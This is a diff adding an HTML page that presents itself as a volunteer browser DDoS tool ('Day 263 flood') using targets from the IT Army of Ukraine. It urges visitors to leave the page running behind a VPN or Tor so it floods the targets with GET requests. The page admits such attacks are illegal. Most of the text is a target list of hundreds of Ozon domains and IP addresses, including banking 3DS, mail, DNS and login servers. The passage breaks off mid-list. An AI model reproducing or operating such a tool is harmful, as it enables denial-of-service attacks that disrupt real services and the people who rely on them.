@@ -1,0 +1,936 @@
+<!doctype html><head>
+<html lang="en">
+<meta charset="utf-8">
+<meta name="viewport" content="width=1024">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>Day 263 flood</title>
+<link href="https://www.helpukr.xyz/bootstrap.helpukr.css" rel="stylesheet" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" crossorigin="anonymous"></script>
+<script src= "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+</head>
+
+<style>
+/* width */
+::-webkit-scrollbar {
+  width: 10px;
+  overflow: auto;
+  height: 0em;
+}
+/* Track */
+::-webkit-scrollbar-track {
+  background: #34a8eb;
+}
+/* Handle */
+::-webkit-scrollbar-thumb {
+  background: #63c6ff
+  ;
+}
+/* Handle on hover */
+::-webkit-scrollbar-thumb:hover {
+  background: yellow;
+}
+.style10 {
+	font-size: 9px;
+	color: #FFFFFF;
+}
+</style>
+	<script> 
+		/* This method uses ipify's api to get the clients IP Address. 
+		This method is completely free and no limitations of use. */ 
+		$.getJSON("https://api.ipify.org?format=json", 
+										function(data) { 
+			// userip element is where the IP will be displayed
+			$("#userip").html(data.ip); 
+		}) 
+	</script>
+	<style> 
+		h6 {
+		color:white;
+		}
+	</style>
+    <style>
+        body {
+            padding: 0;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #FFD600;
+        }
+        .title {
+            margin: 3rem auto 3rem auto;
+            text-align: center;
+            color: #005BBC;
+        }
+        .intro .howto {
+            background-color: #005BBC;
+        }
+        .intro .howto h3 {
+            color: #FFD600;
+            text-align: center;
+            margin-top: 1rem;
+        }
+        .intro .howto p {
+            color: white;
+            text-align: justify;
+        }
+
+        .footer {
+    color: #005BBC;
+    margin-top: 2rem;
+    text-align: center;
+        }
+        .desc{
+            color:black;
+            padding-top: 2rem;
+            padding-bottom: 2rem;
+            margin: 0 auto;
+            width: 60%;
+        }
+        .desc h3 {
+            text-align: center;
+            color: #005BBC;
+        }
+        #stats h4 {
+            font-size: 1.1em;
+            text-decoration: underline;
+            color: #005BBC;
+            font-weight: 400;
+        }
+        table.status {
+            margin-bottom: 10px;
+        }
+    .style1 {
+	color: #CC0000;
+	font-weight: bold;
+}
+.style6 {color: #FF6262}
+    .style7 {font-size: 0.1px}
+    .style9 {
+	color: #FFD600;
+	font-weight: bold;
+	font-size: 18px;
+}
+    .style10 {font-size: 24px}
+    .style11 {
+	font-size: 16px;
+	color: #FFFFFF;
+} 
+    .style13 {
+	margin: 3rem auto 3rem auto;
+	text-align: center;
+	color: #FFD600;
+	font-size: 24px;
+	font-weight: bold;
+}
+    .style14 {color: #FFFFFF}
+    .style15 {color: #FFFF00}
+    .style16 {color: #FF3300}
+    .style17 {color: #FF6633}
+.style21 {color: #B9DCFF}
+    .style22 {color: #ECE3AA}
+	table {
+  border-color: #fffd9c;
+}
+</style>
+<body>
+    <div class="modal" id="HelpUKR-WarningBox" tabindex="-1" role="dialog" aria-labelledby="HelpUKR-WarningBoxLabel" aria-hidden="true" data-bs-backdrop="static" data-bs-keyboard="false">
+    <div class="modal-dialog modal-dialog-centered" role="document">
+    <div class="modal-content">
+    <div class="modal-header" style=" padding-bottom: 4px; padding-top: 3px;padding-left: 3px;">
+    <h5 id="HelpUKR-WarningBoxLabel" style=" margin-bottom: 0px;">
+	<span class="modal-title style1"><img class="qIBnUc" src="https://i.imgur.com/hwWmsDc.png" draggable="false" width="50px" alt="UKR"> Warning: </span><span class="modal-title style6">Read before you continue.&nbsp;<span class="style16"><i>[</span><span class="style17"><b>Day 263</span></b><span class="style16">]</i></span></span></h5></div>
+    <div class="modal-body" style=" padding-top: 5px; padding-bottom: 0px;">
+    <p style=" margin-bottom: 0px;">As you’ll already be aware, DDoSin or participating in any kind of cyber-attack in general is illegal, and usually for good reason.</p>
+<hr style=" margin-top: 3px; margin-bottom: 3px;">
+    <p style=" margin-bottom: 0px;">Click "Continue" if you have a VPN, Proxy, the Tor browser or  your own secure connection &amp; wish to support Ukraine in taking down Russian propaganda and services aiding Putins invasion</p>
+<hr style=" margin-top: 3px; margin-bottom: 3px;">
+		This works by sending GET requests to each targeted website. It’s like opening each website in a random sequence on your PC and re-requesting the data over and over, although the data is not saved or cached, Due to the way it work, It should be fair to say that your Internet service Provider (ISP) won’t be any more bothered about this than they would you browsing the internet, but its always best to stay safe when it comes to security.                                                                                                                                                                                                                                                           
+<hr style=" margin-top: 3px; margin-bottom: 3px;">
+    <p><span style="font-size:14px;"><u></u><strong>Message from the IT Army of Ukraine regarding Todays targets: </strong></span>&nbsp;<br>
+&nbsp;&nbsp;On the day of shopping, we will reduce the planned sales<br>
+&nbsp;&nbsp;on russian trading platforms and large online stores. <br>
+&nbsp;&nbsp;Let's start with Ozon.&nbsp; <em>&nbsp;</em></p>
+    </div>
+    <div class="modal-footer">
+    <button type="button" class="btn btn-secondary" onClick="window.location.href='https://www.helpukr.xyz'">Leave</button>
+    <button type="button" class="btn btn-primary" data-dismiss="HelpUKR-WarningBoxLabel" onClick="togglePause(); myModal.toggle();">Continue</button></div></div></div></div>
+    <table width="100%" border="0" align="center" bgcolor="#005BBC">
+      <tr>
+        <td bgcolor="#004A9D"><div align="center">
+          <table width="200" border="1" style="border-top-width: 0px;">
+              <tbody><tr>
+                <td><table width="989" border="1" align="left" style="border-top-width: 0px;border-bottom-width: 0px;border-left-width: 0px;border-right-width: 0px;">
+                  <tbody>
+                    <tr>
+                      <td width="239" bgcolor="#005BB7"><div align="right"><span class="style14"><strong> Info:</strong> Your Public IP Address is: </span></div></td>
+                      <td width="175" bgcolor="#005BB7"><h6 id="userip" style="margin-bottom: 0px;">Loading..</h6></td>
+                      <td width="553" bgcolor="#005BB7"><div align="right"><span class="style21">For privacy, download the Tor Browser:</span> <a href="https://www.torproject.org/download/" target="_blank" class="style22" rel="nofollow">https://www.torproject.org/download/</a> &nbsp; </div></td>
+                    </tr>
+                  </tbody>
+                </table></td>
+              </tr>
+            </tbody></table>
+          <p class="style13" style="margin-top: 0px;margin-bottom: 0px;">Propaganda http(s) flood for <span class="style15">Day 263 </span>using targets from the IT Army of Ukraine.</p>
+        </div></td>
+      </tr><tr>
+        <td bgcolor="#0057B7"><div align="center" class="style9 style10">
+          <h3><u>Information about this tool.</u></h3>
+        </div></td>
+      </tr><tr>
+        <td><table width="90%" border="0" align="center">
+          <tr>
+            <td align="center"><p class="style11">This tool is hosted via <a href="https://pages.github.com/" target="_blank" class="align-content-sm-between"><a href="https://pages.github.com/" target="_blank" class="style15">GitHub Page</a>, You can download it for local use and customization <a href="https://raw.githubusercontent.com/helpukr/helpukr.github.io/main/day263.htm" target="_blank" class="style15">here</a>. A new page will be added for each day, with a new set of targets from the Ukrainian IT Army's telegram servers.</p>
+              <p class="style11">All of the news in the Russian federation is fake and need to be shut down, we need as many people as possible to help. Just a tiny 1kbps of data could be the edge needed to take down a server hosting propaganda.<br>
+                <br>Just open this page and leave it running on your devices as long as possible, it will flood targets selected specifically for that day.<br>
+                Targets are chosen by an intelligence team who are always looking at what services are aiding Russia’s war,together we can pose a huge load on their infrastructure.</p>
+          <details>
+			  <summary><span style="color: #ffff99;">Click Here for <b>FAQ</b> <i>(Questions & Answers)</i></span></summary>
+              <p><table width="100%" border="0">
+                <tbody><tr>   
+                  <td><hr style=" margin-top: 5px; margin-bottom: 5px; color: #FFFFFF"><p class="style11">FAQ:<br>
+                    <span style="color: #ffff99;"><strong>Q)</strong></span> How can I use this in the tor browser if HTTPS overrides HTTP no matter what i try?<br>
+                    <span style="color: #ffff99;"><strong>A)</strong></span> Download the page for local use, it won't use any http/https protocols because those are used to request files from a web server, but using it locally (directly from your computer) bypasses the need and allows you to flood both HTTP and HTTPS from your TOR Browser's IP.</p>
+                    <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> How can I see what's happening in more detail?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> 
+                      open the developer console by pressing F12 and select the Network Tab.<br>
+                      If you're on a mac you can't use F12 for this, instead right click anywhere on the site and click inspect, then click the network tab</p>
+                    <p class="style11" style="margin-bottom: 0px;"><span style="color: #ffff99;"><strong>Q)</strong></span> After so much time has passed, my browser/computer become very laggy and unresponsive or my browser crashes, how can I fix this?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> This happens because everything that happens is logged by the browser, but you can stop it pretty easily.<br>
+                      In the Network tab on the developer console (F12), press both the red button and the stop symbol.</p>
+                    <details style="margin-bottom: 16px;">
+                      <summary><span style="color: #ffff99;">Click Here to see Example</span></summary>
+                      <img src="https://i.imgur.com/5Cw6kai.png" draggable="false"> </details>
+                    <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> Why are some of the requests having the same number error after a while?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> This is likely caused by the IP of the VPN you're using has been blocked on their side, but it could also mean the site's just totally overloaded and cannot respond to any requests.<br>Also if you’re are using https:// in the address bar that would cause the http:// addresses to do the same</p></td>
+                    </tr>
+                </tbody>
+            </table></p>
+          </details>
+            <hr style=" margin-top: 5px; margin-bottom: 5px; color: #FFFFFF"></td>
+          </tr>
+        </table>
+          <table width="613" border="0" align="center">
+            <tr>
+              <td width="607"><h3 align="center" class="style14">Session Status</h3>
+                <p align="center" class="style14" style=" margin-bottom: 0px; padding-bottom: 2px;">Below is a log of sites that ether responded with errors or failed to respond at all.<br>
+                  It’s normal for this number to count up slow or fast and can often change.<br>
+                  If a lot of services are overloaded the numbers will go fast, else they’ll go slower.<br>
+                  If all requests are the same as all errors on some sites, it most likely means that the<br>
+                  site operator has banned the IP you’re using.</p>
+              </td>
+            </tr>
+          </table>
+	    </td>
+      </tr>
+    </table>
+<div class="desc text-center" style=" padding-top: 4px;">
+  <p align="center" class="style7" style=" margin-bottom: 0px;">Total number of requests: <span id="totalrequests">0</span></p>
+  <p>So far <span id="totalerrors"><em>zero</em></span> sites have responded with errors</p>
+<button type="button" class="btn btn-primary" onClick="togglePause();" style=" padding-left: 32px; padding-right: 32px; padding-top: 8px; padding-bottom: 8px;">Resume</button></div>
+<div id="stats" class="container">
+  <div class="row">
+  </div>
+</div>
+<p class="footer">This website is an easy to run solution to flooding Russian propaganda via any internet capable device with a browser.<br>
+      For example you can walk around town shopping and flood Russian propaganda from a phone in your pocket.<br>
+      It can even be used via the browser app on a Smart TV in the background whilst you watch TV.<br>
+      With your help you can convince a Russian to rebel agents the war by making them<br>
+      look elsewhere for news, remember, Nothing you do is too little!<br>
+      Glory to Ukraine, Glory to the hero’s.<br><br>
+	  <center>
+	    <div id="betabox" style="text-align: center"><span class="footer"><strong><span style="color:#3E7EFF"><em><u>Beta</u>:</em></span></strong> Estimated data requested from servers via GET: <span class="number-counter" data-count-from="0" data-count-to="1000000000000" data-count-speed="0.02">0</span>MB (MegaBytes)</span></div></center>
+<style>#betabox {
+  padding: 1px ;
+  border-top: 1px solid #3498db;
+  border-right: 1px solid #3498db;
+  background-color: #FFE248;
+  line-height: 110%;
+  border-left: 1px solid #3498db;
+  align-content: center;
+  align-self: 4px ;
+  width: 570px ;
+}</style>
+<script>
+        // target list
+        var urls = [
+        //Customers of the Russian Alfa-Bank cannot make payments, or at least log in to online banking or the application. Also they can't get into Alfa-investment either. We notice more and more comments about problems, so today we continue to work on the Alfa infrastructure. Alfa says that "there is no failure". They remind someone... 🤔
+		    'https://ozon.ru',
+		    'https://www.ozon.ru',
+		    'https://nsz501s1.ozon.ru',
+		    'https://nsz502s1.ozon.ru',
+		    'https://nsz503s1.ozon.ru',
+		    'https://ns8-l2.nic.ru',
+		    'https://185.73.195.6',
+		    'https://185.73.195.7',
+		    'https://185.73.195.27',
+		    'https://91.217.21.20',
+		    'https://178.248.238.156',
+		    'https://myyp11.news.ozon.ru',
+		    'https://185.235.29.11',
+		    'https://smtpz20s3.ozon.ru',
+		    'https://185.73.195.232',
+		    'https://myyp21.news.ozon.ru',
+		    'https://185.235.29.21',
+		    'https://edge-lb-z23-g1.ozon.ru',
+		    'https://91.223.93.3',
+		    'https://myyp13.news.ozon.ru',
+		    'https://185.235.29.13',
+		    'https://integration.learning.ozon.ru',
+		    'https://91.223.93.3',
+		    'https://smtpz1s6.ozon.ru',
+		    'https://185.73.193.51',
+		    'https://smtpz20s1.ozon.ru',
+		    'https://185.73.195.248',
+		    'https://partner.ozon.ru',
+		    'https://185.71.67.161',
+		    'https://nsz2s1.ozon.ru',
+		    'https://185.73.195.247',
+		    'https://mx42.news.ozon.ru',
+		    'https://91.239.43.226',
+		    'https://smtpz23s4.ozon.ru',
+		    'https://91.223.93.12',
+		    'https://3ds-v2-auth.ecom-bank.ozon.ru',
+		    'https://178.248.239.190',
+		    'https://gosuslugi.ozon.ru',
+		    'https://91.223.93.3',
+		    'https://nsz1s1.ozon.ru',
+		    'https://185.73.193.15',
+		    'https://nsz23s1.ozon.ru',
+		    'https://91.223.93.10',
+		    'https://mapi.learning.ozon.ru',
+		    'https://91.223.93.3',
+		    'https://smtpz20s5.ozon.ru',
+		    'https://185.73.195.235',
+		    'https://rest.learning.ozon.ru',
+		    'https://91.223.93.3',
+		    'https://myyp10.news.ozon.ru',
+		    'https://185.235.29.10',
+		    'https://3ds-v2-auth-test.ecom-bank.ozon.ru',
+		    'https://178.248.232.238',
+		    'https://ec.ozon.ru',
+		    'https://t10.news.ozon.ru',
+		    'https://91.223.93.161',
+		    'https://edge-lb-z502-g1.ozon.ru',
+		    'https://195.34.20.249',
+		    'https://learning.learning.ozon.ru',
+		    'https://91.223.93.2',
+		    'https://sso.ozon.ru',
+		    'https://178.248.239.230',
+		    'https://smtpz1s1.ozon.ru',
+		    'https://185.73.193.13',
+		    'https://www.secretsanta.ozon.ru',
+		    'https://195.19.10.4',
+		    'https://smtpz23s5.ozon.ru',
+		    'https://91.223.93.13',
+		    'https://short.learning.ozon.ru',
+		    'https://91.223.93.2',
+		    'https://mxz20s1.ozon.ru',
+		    'https://185.73.195.250',
+		    'https://t2.news.ozon.ru',
+		    'https://91.223.93.150',
+		    'https://prometheus.learning.ozon.ru',
+		    'https://91.223.93.3',
+		    'https://nsz2s1.news.ozon.ru',
+		    'https://91.223.93.100',
+		    'https://demo.ozon.ru',
+		    'https://78.111.82.178',
+		    'https://smtpz20s2.ozon.ru',
+		    'https://185.73.195.249',
+		    'https://smtpz20s6.ozon.ru',
+		    'https://185.73.195.234',
+		    'https://news.ozon.ru',
+		    'https://91.223.93.157',
+		    'https://smtpz23s6.ozon.ru',
+		    'https://91.223.93.14',
+		    'https://mx40.news.ozon.ru',
+		    'https://91.239.43.224',
+		    'https://smtpz2s2.ozon.ru',
+		    'https://91.223.93.138',
+		    'https://seller.learning.ozon.ru',
+		    'https://91.223.93.3',
+		    'https://autodiscover.ozon.ru',
+		    'https://195.34.20.230',
+		    'https://finance.ozon.ru',
+		    'https://178.248.232.83',
+		    'https://office.ozon.ru',
+		    'https://178.248.239.231',
+		    'https://smtpz2s1.ozon.ru',
+		    'https://91.223.93.137',
+		    'https://calculator.ozon.ru',
+		    'https://178.248.234.3',
+		    'https://id.ozon.ru',
+		    'https://178.248.233.39',
+		    'https://t21.news.ozon.ru',
+		    'https://91.223.93.172',
+		    'https://myyp22.news.ozon.ru',
+		    'https://185.235.29.22',
+		    'https://bank.ozon.ru',
+		    'https://178.248.232.83',
+		    'https://bonus.ozon.ru',
+		    'https://83.222.253.38',
+		    'https://nsz1s1.news.ozon.ru',
+		    'https://185.73.193.15',
+		    'https://mx41.news.ozon.ru',
+		    'https://91.239.43.225',
+		    'https://nsz502s1.ozon.ru',
+		    'https://185.73.195.7',
+		    'https://smtp-notifications.ozon.ru',
+		    'https://185.73.195.233',
+		    'https://webconf.ozon.ru',
+		    'https://185.73.193.29',
+		    'https://smtpz1s2.ozon.ru',
+		    'https://185.73.193.14',
+		    'https://edge-lb-g1.ozon.ru',
+		    'https://195.34.20.248',
+		    'https://exedge02z1.ozon.ru',
+		    'https://185.73.193.44',
+		    'https://seller-admin.ozon.ru',
+		    'https://178.248.239.222',
+		    'https://myyp12.news.ozon.ru',
+		    'https://185.235.29.12',
+		    'https://manager.learning.ozon.ru',
+		    'https://91.223.93.3',
+		    'https://t13.news.ozon.ru',
+		    'https://91.223.93.164',
+		    'https://profit.learning.ozon.ru',
+		    'https://91.223.93.2',
+		    'https://exedge.ozon.ru',
+		    'https://185.73.195.9',
+		    'https://smtpz1s4.ozon.ru',
+		    'https://185.73.193.50',
+		    'https://1testintegration.learning.ozon.ru',
+		    'https://91.223.93.3',
+		    'https://sellerstage.learning.ozon.ru',
+		    'https://91.223.93.3',
+		    'https://tickets.ozon.ru',
+		    'https://195.246.8.136',
+		    'https://3ds-v2-challenge.ecom-bank.ozon.ru',
+		    'https://178.248.239.190',
+		    'https://logistics.ozon.ru',
+		    'https://91.223.93.3',
+		    'https://smtpz23s3.ozon.ru',
+		    'https://91.223.93.11',
+		    'https://t1.news.ozon.ru',
+		    'https://91.223.93.149',
+		    'https://card.ozon.ru',
+		    'https://194.85.18.1',
+		    'https://t12.news.ozon.ru',
+		    'https://91.223.93.163',
+		    'https://ns2.ozon.ru',
+		    'https://91.223.93.136',
+		    'https://testlegaci.learning.ozon.ru',
+		    'https://91.223.93.2',
+		    'https://mxz2s1.ozon.ru',
+		    'https://91.223.93.134',
+		    'https://mx.secretsanta.ozon.ru',
+		    'https://195.19.10.4',
+		    'https://mxz1s1.ozon.ru',
+		    'https://185.73.193.12',
+		    'https://3ds-v2-challenge-test.ecom-bank.ozon.ru',
+		    'https://178.248.232.238',
+		    'https://sip.ozon.ru',
+		    'https://185.73.193.17',
+		    'https://secretsanta.ozon.ru',
+		    'https://195.19.10.4',
+		    'https://nsz501s1.ozon.ru',
+		    'https://185.73.195.6',
+		    'https://nsz20s1.ozon.ru',
+		    'https://185.73.195.247',
+		    'https://owa.ozon.ru',
+		    'https://195.34.20.230',
+		    'https://api.learning.ozon.ru',
+		    'https://91.223.93.2',
+		    'https://seller.ozon.ru',
+		    'https://162.159.129.64',
+		    'https://myyp20.news.ozon.ru',
+		    'https://185.235.29.20',
+		    'https://www.learning.ozon.ru',
+		    'https://91.223.93.3',
+		    'https://www.ozon.ru',
+		    'https://162.159.129.64',
+		    'https://mx31.news.ozon.ru',
+		    'https://91.239.43.215',
+		    'https://performance.ozon.ru',
+		    'https://91.223.93.2',
+		    'https://t20.news.ozon.ru',
+		    'https://91.223.93.171',
+		    'https://3ds-v2-challenge-test.bank.ozon.ru',
+		    'https://178.248.232.171',
+		    'https://smtpz1s5.ozon.ru',
+		    'https://185.73.193.52',
+		    'https://api-seller.ozon.ru',
+		    'https://178.248.238.158',
+		    'https://mx32.news.ozon.ru',
+		    'https://91.239.43.216',
+		    'https://www2.ozon.ru',
+		    'https://srv2.test.ozon.ru',
+		    'https://www.ipm.test.ozon.ru',
+		    'https://crm.ozon.ru',
+		    'https://ows.ozon.ru',
+		    'https://university.ozon.ru',
+		    'https://rocket.ozon.ru',
+		    'https://securepay.ozon.ru',
+		    'https://api.university.ozon.ru',
+		    'https://vms.learning.ozon.ru',
+		    'https://video.learning.ozon.ru',
+		    'https://sms.service.test.ozon.ru',
+		    'https://help.ozon.ru',
+		    'https://corp.ozon.ru',
+		    'https://tech.ozon.ru',
+		    'https://com.test.ozon.ru',
+		    'https://sccmprm.ozon.ru',
+		    'https://t.news.ozon.ru',
+		    'https://localhost.ozon.ru',
+		    'https://wstat.ozon.ru',
+		    'https://business.ozon.ru',
+		    'https://push.ozon.ru',
+		    'https://cs.ozon.ru',
+		    'https://mapi.university.ozon.ru',
+		    'https://marafonsale.ozon.ru',
+		    'https://mail2.ozon.ru',
+		    'https://mx33.news.ozon.ru',
+		    'https://retail.ozon.ru',
+		    'https://ecom-bank.ozon.ru',
+		    'https://moments.ozon.ru',
+		    'https://bundle.ozon.ru',
+		    'https://seller-edu.ozon.ru',
+		    'https://etls.ozon.ru',
+		    'https://hkqrpk.ozon.ru',
+		    'https://learning.ozon.ru',
+		    'https://api.ozon.ru',
+		    'https://bigsale.ozon.ru',
+		    'https://news.ozon.ru',
+		    'https://all.ozon.ru',
+		    'https://merchant-platform.ozon.ru',
+		    'https://goschool.ozon.ru',
+		    'https://marketplace.ozon.ru',
+		    'https://sdweb.test.ozon.ru',
+		    'https://megasale.ozon.ru',
+		    'https://mmedia.ozon.ru',
+		    'https://ballon.ozon.ru',
+		    'https://birthday.ozon.ru',
+		    'https://support.ozon.ru',
+		    'https://foody.ozon.ru',
+		    'https://smtp-relays.ozon.ru',
+		    'https://blog.ozon.ru',
+		    'https://forum.ozon.ru',
+		    'https://vpn.ozon.ru',
+		    'https://user-account.ozon.ru',
+		    'https://global.university.ozon.ru',
+		    'https://retail-api.ozon.ru',
+		    'https://m.ozon.ru',
+		    'https://ws.ozon.ru',
+		    'https://alco.ozon.ru',
+		    'https://job.ozon.ru',
+		    'https://docs.ozon.ru',
+		    'https://sgateway.ozon.ru',
+		    'http://ozon.ru',
+		    'http://www.ozon.ru',
+		    'http://nsz501s1.ozon.ru',
+		    'http://nsz502s1.ozon.ru',
+		    'http://nsz503s1.ozon.ru',
+		    'http://ns8-l2.nic.ru',
+		    'http://185.73.195.6',
+		    'http://185.73.195.7',
+		    'http://185.73.195.27',
+		    'http://91.217.21.20',
+		    'http://178.248.238.156',
+		    'http://myyp11.news.ozon.ru',
+		    'http://185.235.29.11',
+		    'http://smtpz20s3.ozon.ru',
+		    'http://185.73.195.232',
+		    'http://myyp21.news.ozon.ru',
+		    'http://185.235.29.21',
+		    'http://edge-lb-z23-g1.ozon.ru',
+		    'http://91.223.93.3',
+		    'http://myyp13.news.ozon.ru',
+		    'http://185.235.29.13',
+		    'http://integration.learning.ozon.ru',
+		    'http://91.223.93.3',
+		    'http://smtpz1s6.ozon.ru',
+		    'http://185.73.193.51',
+		    'http://smtpz20s1.ozon.ru',
+		    'http://185.73.195.248',
+		    'http://partner.ozon.ru',
+		    'http://185.71.67.161',
+		    'http://nsz2s1.ozon.ru',
+		    'http://185.73.195.247',
+		    'http://mx42.news.ozon.ru',
+		    'http://91.239.43.226',
+		    'http://smtpz23s4.ozon.ru',
+		    'http://91.223.93.12',
+		    'http://3ds-v2-auth.ecom-bank.ozon.ru',
+		    'http://178.248.239.190',
+		    'http://gosuslugi.ozon.ru',
+		    'http://91.223.93.3',
+		    'http://nsz1s1.ozon.ru',
+		    'http://185.73.193.15',
+		    'http://nsz23s1.ozon.ru',
+		    'http://91.223.93.10',
+		    'http://mapi.learning.ozon.ru',
+		    'http://91.223.93.3',
+		    'http://smtpz20s5.ozon.ru',
+		    'http://185.73.195.235',
+		    'http://rest.learning.ozon.ru',
+		    'http://91.223.93.3',
+		    'http://myyp10.news.ozon.ru',
+		    'http://185.235.29.10',
+		    'http://3ds-v2-auth-test.ecom-bank.ozon.ru',
+		    'http://178.248.232.238',
+		    'http://ec.ozon.ru',
+		    'http://t10.news.ozon.ru',
+		    'http://91.223.93.161',
+		    'http://edge-lb-z502-g1.ozon.ru',
+		    'http://195.34.20.249',
+		    'http://learning.learning.ozon.ru',
+		    'http://91.223.93.2',
+		    'http://sso.ozon.ru',
+		    'http://178.248.239.230',
+		    'http://smtpz1s1.ozon.ru',
+		    'http://185.73.193.13',
+		    'http://www.secretsanta.ozon.ru',
+		    'http://195.19.10.4',
+		    'http://smtpz23s5.ozon.ru',
+		    'http://91.223.93.13',
+		    'http://short.learning.ozon.ru',
+		    'http://91.223.93.2',
+		    'http://mxz20s1.ozon.ru',
+		    'http://185.73.195.250',
+		    'http://t2.news.ozon.ru',
+		    'http://91.223.93.150',
+		    'http://prometheus.learning.ozon.ru',
+		    'http://91.223.93.3',
+		    'http://nsz2s1.news.ozon.ru',
+		    'http://91.223.93.100',
+		    'http://demo.ozon.ru',
+		    'http://78.111.82.178',
+		    'http://smtpz20s2.ozon.ru',
+		    'http://185.73.195.249',
+		    'http://smtpz20s6.ozon.ru',
+		    'http://185.73.195.234',
+		    'http://news.ozon.ru',
+		    'http://91.223.93.157',
+		    'http://smtpz23s6.ozon.ru',
+		    'http://91.223.93.14',
+		    'http://mx40.news.ozon.ru',
+		    'http://91.239.43.224',
+		    'http://smtpz2s2.ozon.ru',
+		    'http://91.223.93.138',
+		    'http://seller.learning.ozon.ru',
+		    'http://91.223.93.3',
+		    'http://autodiscover.ozon.ru',
+		    'http://195.34.20.230',
+		    'http://finance.ozon.ru',
+		    'http://178.248.232.83',
+		    'http://office.ozon.ru',
+		    'http://178.248.239.231',
+		    'http://smtpz2s1.ozon.ru',
+		    'http://91.223.93.137',
+		    'http://calculator.ozon.ru',
+		    'http://178.248.234.3',
+		    'http://id.ozon.ru',
+		    'http://178.248.233.39',
+		    'http://t21.news.ozon.ru',
+		    'http://91.223.93.172',
+		    'http://myyp22.news.ozon.ru',
+		    'http://185.235.29.22',
+		    'http://bank.ozon.ru',
+		    'http://178.248.232.83',
+		    'http://bonus.ozon.ru',
+		    'http://83.222.253.38',
+		    'http://nsz1s1.news.ozon.ru',
+		    'http://185.73.193.15',
+		    'http://mx41.news.ozon.ru',
+		    'http://91.239.43.225',
+		    'http://nsz502s1.ozon.ru',
+		    'http://185.73.195.7',
+		    'http://smtp-notifications.ozon.ru',
+		    'http://185.73.195.233',
+		    'http://webconf.ozon.ru',
+		    'http://185.73.193.29',
+		    'http://smtpz1s2.ozon.ru',
+		    'http://185.73.193.14',
+		    'http://edge-lb-g1.ozon.ru',
+		    'http://195.34.20.248',
+		    'http://exedge02z1.ozon.ru',
+		    'http://185.73.193.44',
+		    'http://seller-admin.ozon.ru',
+		    'http://178.248.239.222',
+		    'http://myyp12.news.ozon.ru',
+		    'http://185.235.29.12',
+		    'http://manager.learning.ozon.ru',
+		    'http://91.223.93.3',
+		    'http://t13.news.ozon.ru',
+		    'http://91.223.93.164',
+		    'http://profit.learning.ozon.ru',
+		    'http://91.223.93.2',
+		    'http://exedge.ozon.ru',
+		    'http://185.73.195.9',
+		    'http://smtpz1s4.ozon.ru',
+		    'http://185.73.193.50',
+		    'http://1testintegration.learning.ozon.ru',
+		    'http://91.223.93.3',
+		    'http://sellerstage.learning.ozon.ru',
+		    'http://91.223.93.3',
+		    'http://tickets.ozon.ru',
+		    'http://195.246.8.136',
+		    'http://3ds-v2-challenge.ecom-bank.ozon.ru',
+		    'http://178.248.239.190',
+		    'http://logistics.ozon.ru',
+		    'http://91.223.93.3',
+		    'http://smtpz23s3.ozon.ru',
+		    'http://91.223.93.11',
+		    'http://t1.news.ozon.ru',
+		    'http://91.223.93.149',
+		    'http://card.ozon.ru',
+		    'http://194.85.18.1',
+		    'http://t12.news.ozon.ru',
+		    'http://91.223.93.163',
+		    'http://ns2.ozon.ru',
+		    'http://91.223.93.136',
+		    'http://testlegaci.learning.ozon.ru',
+		    'http://91.223.93.2',
+		    'http://mxz2s1.ozon.ru',
+		    'http://91.223.93.134',
+		    'http://mx.secretsanta.ozon.ru',
+		    'http://195.19.10.4',
+		    'http://mxz1s1.ozon.ru',
+		    'http://185.73.193.12',
+		    'http://3ds-v2-challenge-test.ecom-bank.ozon.ru',
+		    'http://178.248.232.238',
+		    'http://sip.ozon.ru',
+		    'http://185.73.193.17',
+		    'http://secretsanta.ozon.ru',
+		    'http://195.19.10.4',
+		    'http://nsz501s1.ozon.ru',
+		    'http://185.73.195.6',
+		    'http://nsz20s1.ozon.ru',
+		    'http://185.73.195.247',
+		    'http://owa.ozon.ru',
+		    'http://195.34.20.230',
+		    'http://api.learning.ozon.ru',
+		    'http://91.223.93.2',
+		    'http://seller.ozon.ru',
+		    'http://162.159.129.64',
+		    'http://myyp20.news.ozon.ru',
+		    'http://185.235.29.20',
+		    'http://www.learning.ozon.ru',
+		    'http://91.223.93.3',
+		    'http://www.ozon.ru',
+		    'http://162.159.129.64',
+		    'http://mx31.news.ozon.ru',
+		    'http://91.239.43.215',
+		    'http://performance.ozon.ru',
+		    'http://91.223.93.2',
+		    'http://t20.news.ozon.ru',
+		    'http://91.223.93.171',
+		    'http://3ds-v2-challenge-test.bank.ozon.ru',
+		    'http://178.248.232.171',
+		    'http://smtpz1s5.ozon.ru',
+		    'http://185.73.193.52',
+		    'http://api-seller.ozon.ru',
+		    'http://178.248.238.158',
+		    'http://mx32.news.ozon.ru',
+		    'http://91.239.43.216',
+		    'http://www2.ozon.ru',
+		    'http://srv2.test.ozon.ru',
+		    'http://www.ipm.test.ozon.ru',
+		    'http://crm.ozon.ru',
+		    'http://ows.ozon.ru',
+		    'http://university.ozon.ru',
+		    'http://rocket.ozon.ru',
+		    'http://securepay.ozon.ru',
+		    'http://api.university.ozon.ru',
+		    'http://vms.learning.ozon.ru',
+		    'http://video.learning.ozon.ru',
+		    'http://sms.service.test.ozon.ru',
+		    'http://help.ozon.ru',
+		    'http://corp.ozon.ru',
+		    'http://tech.ozon.ru',
+		    'http://com.test.ozon.ru',
+		    'http://sccmprm.ozon.ru',
+		    'http://t.news.ozon.ru',
+		    'http://localhost.ozon.ru',
+		    'http://wstat.ozon.ru',
+		    'http://business.ozon.ru',
+		    'http://push.ozon.ru',
+		    'http://cs.ozon.ru',
+		    'http://mapi.university.ozon.ru',
+		    'http://marafonsale.ozon.ru',
+		    'http://mail2.ozon.ru',
+		    'http://mx33.news.ozon.ru',
+		    'http://retail.ozon.ru',
+		    'http://ecom-bank.ozon.ru',
+		    'http://moments.ozon.ru',
+		    'http://bundle.ozon.ru',
+		    'http://seller-edu.ozon.ru',
+		    'http://etls.ozon.ru',
+		    'http://hkqrpk.ozon.ru',
